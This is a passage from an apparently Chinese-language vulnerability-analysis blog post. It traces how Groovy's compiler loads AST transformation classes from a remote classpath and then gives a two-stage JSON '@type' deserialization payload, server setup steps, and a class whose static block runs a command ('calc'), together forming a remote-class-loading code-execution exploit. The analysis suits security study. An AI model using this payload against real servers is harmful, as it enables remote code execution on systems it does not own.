class="hljs-built_in">this</span>)).startResolving(classNode, source);<br>    &#125;, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.stubGenerator.generateClass(classNode);<br>            ++<span class="hljs-built_in">this</span>.stubCount;<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException var5) &#123;<br>            source.addException(var5);<br>        &#125;<br><br>    &#125;,<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.control.CompilationUnit#addPhaseOperation()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(ISourceUnitOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(IPrimaryClassNodeOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperations()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperations</span><span class="hljs-params">(CompilationUnit compilationUnit)</span> &#123;<br>    <span class="hljs-type">ASTTransformationsContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> compilationUnit.getASTTransformationsContext();<br>    addGlobalTransforms(context);<br>    compilationUnit.addPhaseOperation((source, ignore, classNode) -&gt; &#123;<br>        <span class="hljs-type">GroovyClassVisitor</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTTransformationCollectorCodeVisitor</span>(source, compilationUnit.getTransformLoader());<br>        visitor.visitClass(classNode);<br>    &#125;, <span class="hljs-number">4</span>);<br>    CompilePhase[] var2 = CompilePhase.values();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    ......<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#addGlobalTransforms(context)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context)</span> &#123;<br>    doAddGlobalTransforms(context, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms(context, true)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAddGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>......<br>    <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var17.hasNext()) &#123;<br>            Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var17.next();<br>            context.getGlobalTransformNames().add((String)entry.getKey());<br>        &#125;<br><br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        transformNames.entrySet().removeIf((entryx) -&gt; &#123;<br>            <span class="hljs-keyword">return</span> !context.getGlobalTransformNames().add((String)entryx.getKey());<br>        &#125;);<br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperationsForGlobalTransforms</span><span class="hljs-params">(CompilationUnit compilationUnit, Map&lt;String, URL&gt; transformNames, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>    <span class="hljs-comment">//获取到被赋予远程classpath的GroovyClassLoader</span><br>    <span class="hljs-type">GroovyClassLoader</span> <span class="hljs-variable">transformLoader</span> <span class="hljs-operator">=</span> compilationUnit.getTransformLoader();<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>        Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var4.next();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从远程加载class对象</span><br>            Class&lt;?&gt; gTransClass = transformLoader.loadClass((String)entry.getKey(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-type">GroovyASTTransformation</span> <span class="hljs-variable">transformAnnotation</span> <span class="hljs-operator">=</span> (GroovyASTTransformation)gTransClass.getAnnotation(GroovyASTTransformation.class);<br>            <span class="hljs-keyword">if</span> (transformAnnotation == <span class="hljs-literal">null</span>) &#123;<br>                compilationUnit.getErrorCollector().addWarning(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WarningMessage</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; is specified as a global transform in &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; but it is not annotated by &quot;</span> + GroovyASTTransformation.class.getName() + <span class="hljs-string">&quot; the global transform associated with it may fail and cause the compilation to fail.&quot;</span>, (CSTNode)<span class="hljs-literal">null</span>, (SourceUnit)<span class="hljs-literal">null</span>));<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ASTTransformation.class.isAssignableFrom(gTransClass)) &#123;<br>                <span class="hljs-comment">//将远程类实例化</span><br>                <span class="hljs-type">ASTTransformation</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> (ASTTransformation)gTransClass.getDeclaredConstructor().newInstance();<br>                <span class="hljs-keyword">if</span> (instance <span class="hljs-keyword">instanceof</span> CompilationUnitAware) &#123;<br>                    ((CompilationUnitAware)instance).setCompilationUnit(compilationUnit);<br>                &#125;<br><br>                CompilationUnit.<span class="hljs-type">ISourceUnitOperation</span> <span class="hljs-variable">suOp</span> <span class="hljs-operator">=</span> (source) -&gt; &#123;<br>                    instance.visit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTNode</span>[]&#123;source.getAST()&#125;, source);<br>                &#125;;<br>                <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>                    compilationUnit.addPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    compilationUnit.addNewPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; is not an ASTTransformation.&quot;</span>, (ProcessingUnit)<span class="hljs-literal">null</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> var10 <span class="hljs-keyword">instanceof</span> InvocationTargetException ? var10.getCause() : var10;<br>            compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Could not instantiate global transform class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot;  because of exception &quot;</span> + ((Throwable)t).toString(), (ProcessingUnit)<span class="hljs-literal">null</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">1.</span>利用隐式类关系将org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、org.codehaus.groovy.control.CompilerConfiguration加入到maping中<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-number">2.</span>利用链加载远程类<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;classpath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;url地址xxx&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>服务器配置：</p><p>新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation</p><p>文件内容为MyExction</p><p>http根目录放置MyExction.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.ast.ASTNode;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.control.SourceUnit;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;<br><br><span class="hljs-meta">@GroovyASTTransformation</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyExction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ASTTransformation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var1);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/92e85c41-0a14-438a-82c0-9b4ef077db7a.png" alt="image-20220922165655351"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
